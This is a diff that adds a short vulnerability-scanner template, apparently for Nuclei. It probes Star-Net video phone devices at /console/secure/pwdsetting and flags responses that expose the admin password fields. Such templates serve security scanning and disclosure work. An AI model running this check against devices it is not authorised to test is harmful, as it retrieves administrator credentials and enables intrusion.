@@ -1,0 +1,21 @@
+id: poc-yaml-star-net-console-pwdsetting
+info:
+  name: 星网锐捷 视频话机设备pwdsetting管理密码信息泄漏
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: information-disclosure
+http:
+  - method: GET
+    path:
+      - "/console/secure/pwdsetting"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"cOldPasswd\""
+          - "\"adminPasswd\""
+          - "\"webport\""
+        part: body
